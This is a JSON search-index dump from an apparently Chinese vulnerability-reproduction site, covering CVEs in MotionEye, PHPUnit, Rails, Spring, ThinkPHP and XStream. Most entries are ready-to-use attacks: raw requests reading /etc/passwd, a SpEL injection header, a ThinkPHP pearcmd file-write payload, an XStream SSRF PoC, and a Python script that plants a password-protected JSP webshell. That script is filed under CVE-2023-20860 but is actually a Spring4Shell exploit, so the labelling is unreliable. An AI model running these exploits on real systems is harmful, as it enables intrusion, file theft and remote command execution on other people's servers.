01","objectID":"/laravel-%E5%B0%8F%E4%BA%8E-8.4.2-debug%E6%A8%A1%E5%BC%8F-_ignition-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-3129/:5:0","tags":null,"title":"","uri":"/laravel-%E5%B0%8F%E4%BA%8E-8.4.2-debug%E6%A8%A1%E5%BC%8F-_ignition-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-3129/"},{"categories":null,"content":"参考文章 米斯特团队|漏洞分析 | Laravel Debug页面RCE（CVE-2021-3129）分析复现 陌陌安全|FTP利用|LARAVEL的那个RCE最有趣的点在这里 原作者漏洞分析 ","date":"0001-01-01","objectID":"/laravel-%E5%B0%8F%E4%BA%8E-8.4.2-debug%E6%A8%A1%E5%BC%8F-_ignition-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-3129/:6:0","tags":null,"title":"","uri":"/laravel-%E5%B0%8F%E4%BA%8E-8.4.2-debug%E6%A8%A1%E5%BC%8F-_ignition-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-3129/"},{"categories":null,"content":"MotionEye 视频监控组件 list 信息泄漏洞 CVE-2022-25568 ","date":"0001-01-01","objectID":"/motioneye-%E8%A7%86%E9%A2%91%E7%9B%91%E6%8E%A7%E7%BB%84%E4%BB%B6-list-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%B4%9E-cve-2022-25568/:0:0","tags":null,"title":"","uri":"/motioneye-%E8%A7%86%E9%A2%91%E7%9B%91%E6%8E%A7%E7%BB%84%E4%BB%B6-list-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%B4%9E-cve-2022-25568/"},{"categories":null,"content":"漏洞描述 motionEye是用Python写的motion的Web前端，它可以监视视频信号并检测运动。它可以与多种类型的摄像机配合使用,也可以与电影文件一起使用,从而使您可以分析录制的视频，其中存在一个信息泄漏漏洞，通过构造特定的URL即可获取服务器敏感信息 ","date":"0001-01-01","objectID":"/motioneye-%E8%A7%86%E9%A2%91%E7%9B%91%E6%8E%A7%E7%BB%84%E4%BB%B6-list-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%B4%9E-cve-2022-25568/:1:0","tags":null,"title":"","uri":"/motioneye-%E8%A7%86%E9%A2%91%E7%9B%91%E6%8E%A7%E7%BB%84%E4%BB%B6-list-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%B4%9E-cve-2022-25568/"},{"categories":null,"content":"漏洞影响 MotionEye \u003c= v0.42.1 ","date":"0001-01-01","objectID":"/motioneye-%E8%A7%86%E9%A2%91%E7%9B%91%E6%8E%A7%E7%BB%84%E4%BB%B6-list-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%B4%9E-cve-2022-25568/:2:0","tags":null,"title":"","uri":"/motioneye-%E8%A7%86%E9%A2%91%E7%9B%91%E6%8E%A7%E7%BB%84%E4%BB%B6-list-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%B4%9E-cve-2022-25568/"},{"categories":null,"content":"网络测绘 banner=\"motionEye\" app=\"motionEye\" app=\"motionEye-摄像头服务器\" app=\"motionEye/0.39.3\" app=\"motionEye/0.40\" app=\"motionEye01\" app=\"motionEye/0.33\" app=\"motionEye/0.35\" ","date":"0001-01-01","objectID":"/motioneye-%E8%A7%86%E9%A2%91%E7%9B%91%E6%8E%A7%E7%BB%84%E4%BB%B6-list-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%B4%9E-cve-2022-25568/:3:0","tags":null,"title":"","uri":"/motioneye-%E8%A7%86%E9%A2%91%E7%9B%91%E6%8E%A7%E7%BB%84%E4%BB%B6-list-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%B4%9E-cve-2022-25568/"},{"categories":null,"content":"漏洞复现 通过查看响应Server判断是否使用，访问路由/config/list ","date":"0001-01-01","objectID":"/motioneye-%E8%A7%86%E9%A2%91%E7%9B%91%E6%8E%A7%E7%BB%84%E4%BB%B6-list-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%B4%9E-cve-2022-25568/:4:0","tags":null,"title":"","uri":"/motioneye-%E8%A7%86%E9%A2%91%E7%9B%91%E6%8E%A7%E7%BB%84%E4%BB%B6-list-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%B4%9E-cve-2022-25568/"},{"categories":null,"content":"漏洞POC import sys import json import requests def exp(url): if url[-1] == \"/\": url = url + \"config/list\" else: url = url + \"/config/list\" rus = requests.get(url, verify=False) print(\"信息泄露内容:\") print(json.dumps(json.loads(rus.text), sort_keys=True, indent=4)) if __name__ == '__main__': ip = sys.argv[1] print(\"访问IP:{0}\".format(ip)) exp(ip) ","date":"0001-01-01","objectID":"/motioneye-%E8%A7%86%E9%A2%91%E7%9B%91%E6%8E%A7%E7%BB%84%E4%BB%B6-list-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%B4%9E-cve-2022-25568/:5:0","tags":null,"title":"","uri":"/motioneye-%E8%A7%86%E9%A2%91%E7%9B%91%E6%8E%A7%E7%BB%84%E4%BB%B6-list-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%B4%9E-cve-2022-25568/"},{"categories":null,"content":"PHPUnit eval-stdin.php 远程命令执行漏洞 CVE-2017-9841 ","date":"0001-01-01","objectID":"/phpunit-eval-stdin.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-9841/:0:0","tags":null,"title":"","uri":"/phpunit-eval-stdin.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-9841/"},{"categories":null,"content":"漏洞描述 PHPUnit5.6.3之前的版本，存在一处远程代码执行漏洞，利用漏洞可以获取服务器敏感信息及权限。 ","date":"0001-01-01","objectID":"/phpunit-eval-stdin.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-9841/:1:0","tags":null,"title":"","uri":"/phpunit-eval-stdin.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-9841/"},{"categories":null,"content":"漏洞影响 PHPUnit \u003c 5.6.3 ","date":"0001-01-01","objectID":"/phpunit-eval-stdin.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-9841/:2:0","tags":null,"title":"","uri":"/phpunit-eval-stdin.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-9841/"},{"categories":null,"content":"漏洞复现 漏洞位于 /phpunit/src/Util/PHP/eval-stdin.php 其中关键代码为: eval('?\u003e'.file_get_contents('php://input')); 发送如下请求包执行PHP代码 POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1 Host: Content-Length: 21 Accept-Encoding: gzip ","date":"0001-01-01","objectID":"/phpunit-eval-stdin.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-9841/:3:0","tags":null,"title":"","uri":"/phpunit-eval-stdin.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-9841/"},{"categories":null,"content":"Rails Accept 任意文件读取漏洞 CVE-2019-5418 ","date":"0001-01-01","objectID":"/rails-accept-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2019-5418/:0:0","tags":null,"title":"","uri":"/rails-accept-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2019-5418/"},{"categories":null,"content":"漏洞描述 Ruby on Rails是一个 Web 应用程序框架,是一个相对较新的 Web 应用程序框架，构建在 Ruby 语言之上。这个漏洞主要是由于Ruby on Rails使用了指定参数的render file来渲染应用之外的视图，我们可以通过修改访问某控制器的请求包，通过“…/…/…/…/”来达到路径穿越的目的，然后再通过“{{”来进行模板查询路径的闭合，使得所要访问的文件被当做外部模板来解析。 ","date":"0001-01-01","objectID":"/rails-accept-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2019-5418/:1:0","tags":null,"title":"","uri":"/rails-accept-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2019-5418/"},{"categories":null,"content":"漏洞影响 Rail \u003c= 5.2.2.1 ","date":"0001-01-01","objectID":"/rails-accept-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2019-5418/:2:0","tags":null,"title":"","uri":"/rails-accept-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2019-5418/"},{"categories":null,"content":"网络测绘 title=\"Ruby On Rails\" ","date":"0001-01-01","objectID":"/rails-accept-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2019-5418/:3:0","tags":null,"title":"","uri":"/rails-accept-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2019-5418/"},{"categories":null,"content":"漏洞复现 主页面 验证请求包 GET /robots HTTP/1.1 Host: 127.0.0.1:3000 Accept-Encoding: gzip, deflate Accept: ../../../../../../../../etc/passwd{{ Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close ","date":"0001-01-01","objectID":"/rails-accept-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2019-5418/:4:0","tags":null,"title":"","uri":"/rails-accept-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2019-5418/"},{"categories":null,"content":"Rails sprockets 任意文件读取漏洞 CVE-2018-3760 ","date":"0001-01-01","objectID":"/rails-sprockets-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2018-3760/:0:0","tags":null,"title":"","uri":"/rails-sprockets-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2018-3760/"},{"categories":null,"content":"漏洞描述 Ruby On Rails在开发环境下使用Sprockets作为静态文件服务器，Ruby On Rails是著名Ruby Web开发框架，Sprockets是编译及分发静态资源文件的Ruby库。 Sprockets 3.7.1及之前版本中，存在一处因为二次解码导致的路径穿越漏洞，攻击者可以利用%252e%252e/来跨越到根目录，读取或执行目标服务器上任意文件。 ","date":"0001-01-01","objectID":"/rails-sprockets-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2018-3760/:1:0","tags":null,"title":"","uri":"/rails-sprockets-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2018-3760/"},{"categories":null,"content":"漏洞影响 Sprockets \u003c 3.7.1 ","date":"0001-01-01","objectID":"/rails-sprockets-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2018-3760/:2:0","tags":null,"title":"","uri":"/rails-sprockets-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2018-3760/"},{"categories":null,"content":"网络测绘 title=\"Ruby On Rails\" ","date":"0001-01-01","objectID":"/rails-sprockets-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2018-3760/:3:0","tags":null,"title":"","uri":"/rails-sprockets-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2018-3760/"},{"categories":null,"content":"漏洞复现 主页面 先获取绝对路径 /assets/file:%2f%2f/etc/passwd 再利用POC读取文件 /assets/file:%2f%2f/usr/src/blog/app/assets/images/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd ","date":"0001-01-01","objectID":"/rails-sprockets-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2018-3760/:4:0","tags":null,"title":"","uri":"/rails-sprockets-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2018-3760/"},{"categories":null,"content":"Spring Cloud Config 目录遍历漏洞 CVE-2019-3799 ","date":"0001-01-01","objectID":"/spring-cloud-config-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cve-2019-3799/:0:0","tags":null,"title":"","uri":"/spring-cloud-config-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cve-2019-3799/"},{"categories":null,"content":"漏洞描述 由于 spring-cloud-config-server 模块未对传入路径进行安全限制，攻击者可以利用多个 ..%252f 进行目录遍历，查看服务器其他路径的敏感文件，造成敏感信息泄露。 ","date":"0001-01-01","objectID":"/spring-cloud-config-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cve-2019-3799/:1:0","tags":null,"title":"","uri":"/spring-cloud-config-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cve-2019-3799/"},{"categories":null,"content":"漏洞影响 Spring Cloud Config 2.1.0 to 2.1.1 Spring Cloud Config 2.0.0 to 2.0.3 Spring Cloud Config 1.4.0 to 1.4.5 ","date":"0001-01-01","objectID":"/spring-cloud-config-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cve-2019-3799/:2:0","tags":null,"title":"","uri":"/spring-cloud-config-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cve-2019-3799/"},{"categories":null,"content":"漏洞复现 GET /foo/default/master/..%252F..%252F..%252F..%252Fetc%252fpasswd HTTP/1.1 Host: your-ip:8888 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate DNT: 1 Connection: close Upgrade-Insecure-Requests: 1 ","date":"0001-01-01","objectID":"/spring-cloud-config-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cve-2019-3799/:3:0","tags":null,"title":"","uri":"/spring-cloud-config-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cve-2019-3799/"},{"categories":null,"content":"漏洞修复 Spring 官方最新版本已经对 Spring Cloud Config 目录遍历漏洞进行了修复，下载地址：https://github.com/spring-cloud/spring-cloud-config/releases ","date":"0001-01-01","objectID":"/spring-cloud-config-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cve-2019-3799/:4:0","tags":null,"title":"","uri":"/spring-cloud-config-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cve-2019-3799/"},{"categories":null,"content":"Spring Cloud Function SPEL 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/spring-cloud-function-spel-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/spring-cloud-function-spel-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 Spring Cloud Function 是基于Spring Boot 的函数计算框架，它抽象出所有传输细节和基础架构，允许开发人员保留所有熟悉的工具和流程，并专注于业务逻辑。 由于Spring Cloud Function中RoutingFunction类的apply方法将请求头中的“spring.cloud.function.routing-expression”参数作为Spel表达式进行处理，造成了Spel表达式注入漏洞，未经授权的远程攻击者可利用该漏洞执行任意代码。 ","date":"0001-01-01","objectID":"/spring-cloud-function-spel-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/spring-cloud-function-spel-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 Spring Cloud Function ","date":"0001-01-01","objectID":"/spring-cloud-function-spel-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/spring-cloud-function-spel-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"环境搭建 https://github.com/spring-cloud/spring-cloud-function/tree/main/spring-cloud-function-samples/function-sample-pojo ","date":"0001-01-01","objectID":"/spring-cloud-function-spel-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/spring-cloud-function-spel-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 搭建后访问 发送POC POST /functionRouter HTTP/1.1 Host: 192.168.1.27:9000 spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(\"ping -c 1 dxytoy.dnslog.cn\") Content-Length: 1 接收到请求 ","date":"0001-01-01","objectID":"/spring-cloud-function-spel-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/spring-cloud-function-spel-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Spring Framework 安全绕过漏洞 CVE-2023-20860 ","date":"0001-01-01","objectID":"/spring-framework-%E5%AE%89%E5%85%A8%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2023-20860/:0:0","tags":null,"title":"","uri":"/spring-framework-%E5%AE%89%E5%85%A8%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2023-20860/"},{"categories":null,"content":"漏洞描述 在带有 mvcRequestMatcher 的 Spring Security 配置中使用无前缀双通配符模式会导致 Spring Security 和 Spring MVC 之间的模式匹配不匹配，并可能导致安全绕过。 ","date":"0001-01-01","objectID":"/spring-framework-%E5%AE%89%E5%85%A8%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2023-20860/:1:0","tags":null,"title":"","uri":"/spring-framework-%E5%AE%89%E5%85%A8%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2023-20860/"},{"categories":null,"content":"漏洞影响 6.0.0 - 6.0.6、5.3.0 - 5.3.25（注：5.3 之前的版本不受影响） ","date":"0001-01-01","objectID":"/spring-framework-%E5%AE%89%E5%85%A8%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2023-20860/:2:0","tags":null,"title":"","uri":"/spring-framework-%E5%AE%89%E5%85%A8%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2023-20860/"},{"categories":null,"content":"漏洞复现 exp #!/usr/bin/env python3 #coding:utf-8 import requests import argparse from urllib.parse import urljoin def Exploit(url): headers = {\"suffix\":\"%\u003e//\", \"c1\":\"Runtime\", \"c2\":\"\u003c%\", \"DNT\":\"1\", \"Content-Type\":\"application/x-www-form-urlencoded\" } data = \"class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di\u0026class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp\u0026class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT\u0026class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar\u0026class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=\" try: go = requests.post(url,headers=headers,data=data,timeout=15,allow_redirects=False, verify=False) shellurl = urljoin(url, 'tomcatwar.jsp') shellgo = requests.get(shellurl,timeout=15,allow_redirects=False, verify=False) if shellgo.status_code == 200: print(f\"漏洞存在，shell地址为:{shellurl}?pwd=j\u0026cmd=whoami\") except Exception as e: print(e) pass def main(): parser = argparse.ArgumentParser(description='Srping-Core Rce.') parser.add_argument('--file',help='url file',required=False) parser.add_argument('--url',help='target url',required=False) args = parser.parse_args() if args.url: Exploit(args.url) if args.file: with open (args.file) as f: for i in f.readlines(): i = i.strip() Exploit(i) if __name__ == '__main__': main() ","date":"0001-01-01","objectID":"/spring-framework-%E5%AE%89%E5%85%A8%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2023-20860/:3:0","tags":null,"title":"","uri":"/spring-framework-%E5%AE%89%E5%85%A8%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2023-20860/"},{"categories":null,"content":"漏洞修复 受影响用户及时更新升级到以下修复版本： Spring Framework \u003e= 6.0.7 Spring Framework \u003e= 5.3.26 下载链接：https://spring.io/projects/spring-framework ","date":"0001-01-01","objectID":"/spring-framework-%E5%AE%89%E5%85%A8%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2023-20860/:4:0","tags":null,"title":"","uri":"/spring-framework-%E5%AE%89%E5%85%A8%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2023-20860/"},{"categories":null,"content":"ThinkPHP 命令执行漏洞 CNVD-2022-86535 ","date":"0001-01-01","objectID":"/thinkphp-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2022-86535/:0:0","tags":null,"title":"","uri":"/thinkphp-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2022-86535/"},{"categories":null,"content":"漏洞描述 该漏洞是由于 Thinkphp 开启了多语言功能，并且对参数 lang 传参过滤不严谨，导致攻击者可利用该漏洞执行命令。 ","date":"0001-01-01","objectID":"/thinkphp-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2022-86535/:1:0","tags":null,"title":"","uri":"/thinkphp-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2022-86535/"},{"categories":null,"content":"漏洞影响 ThinkPHP \u003e=V6.0.1，\u003c=V6.0.13 ThinkPHP \u003e=V5.0.X，\u003c=V5.1.X ","date":"0001-01-01","objectID":"/thinkphp-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2022-86535/:2:0","tags":null,"title":"","uri":"/thinkphp-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2022-86535/"},{"categories":null,"content":"漏洞复现 payload： /index?lang=…/…/…/…/…/…/…/…/usr/local/lib/php/pearcmd\u0026+config-create+/\u0026/+/var/www/html/test.php ","date":"0001-01-01","objectID":"/thinkphp-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2022-86535/:3:0","tags":null,"title":"","uri":"/thinkphp-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2022-86535/"},{"categories":null,"content":"漏洞修复 官方已发布漏洞补丁及修复版本，可以评估业务是否受影响后，酌情升级至安全版本。 如不需要多语言功能，请及时关闭此功能，可参考官方文档： https://www.kancloud.cn/manual/thinkphp6_0/1037637 https://static.kancloud.cn/manual/thinkphp5/118132 ","date":"0001-01-01","objectID":"/thinkphp-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2022-86535/:4:0","tags":null,"title":"","uri":"/thinkphp-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2022-86535/"},{"categories":null,"content":"XStream SSRF 反序列化漏洞 CVE-2020-26258 ","date":"0001-01-01","objectID":"/xstream-ssrf-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2020-26258/:0:0","tags":null,"title":"","uri":"/xstream-ssrf-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2020-26258/"},{"categories":null,"content":"漏洞描述 Xstream 是 Java 类库，用来将对象序列化成 XML (JSON) 或反序列化为对象。XStream 是一款开源软件，允许在 BSD 许可证的许可下分发。 参考链接： https://raw.githubusercontent.com/jas502n/CVE-2020-26259/main/CVE_2020_26258.java ","date":"0001-01-01","objectID":"/xstream-ssrf-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2020-26258/:1:0","tags":null,"title":"","uri":"/xstream-ssrf-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2020-26258/"},{"categories":null,"content":"漏洞影响 影响版本： Xstream \u003c = 1.4.14 修复版本： Xstream \u003c = 1.4.15 ","date":"0001-01-01","objectID":"/xstream-ssrf-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2020-26258/:2:0","tags":null,"title":"","uri":"/xstream-ssrf-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2020-26258/"},{"categories":null,"content":"漏洞复现 poc： import com.thoughtworks.xstream.XStream; /* CVE-2020-26258: A Server-Side Forgery Request can be activated unmarshalling with XStream to access data streams from an arbitrary URL referencing a resource in an intranet or the local host. All versions until and including version 1.4.14 https://x-stream.github.io/CVE-2020-26258.html Security framework of XStream not explicitly initialized, using predefined black list on your own risk. */ public class CVE_2020_26258 { public static void main(String[] args) { String ssrf_xml = \"\u003cmap\u003e\\n\" + \" \u003centry\u003e\\n\" + \" \u003cjdk.nashorn.internal.objects.NativeString\u003e\\n\" + \" \u003cflags\u003e0\u003c/flags\u003e\\n\" + \" \u003cvalue class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'\u003e\\n\" + \" \u003cdataHandler\u003e\\n\" + \" \u003cdataSource class='javax.activation.URLDataSource'\u003e\\n\" + \" \u003curl\u003ehttp://localhost:8989/internal/:\u003c/url\u003e\\n\" + \" \u003c/dataSource\u003e\\n\" + \" \u003ctransferFlavors/\u003e\\n\" + \" \u003c/dataHandler\u003e\\n\" + \" \u003cdataLen\u003e0\u003c/dataLen\u003e\\n\" + \" \u003c/value\u003e\\n\" + \" \u003c/jdk.nashorn.internal.objects.NativeString\u003e\\n\" + \" \u003cstring\u003etest\u003c/string\u003e\\n\" + \" \u003c/entry\u003e\\n\" + \"\u003c/map\u003e\"; XStream xstream = new XStream(); xstream.fromXML(ssrf_xml); } } 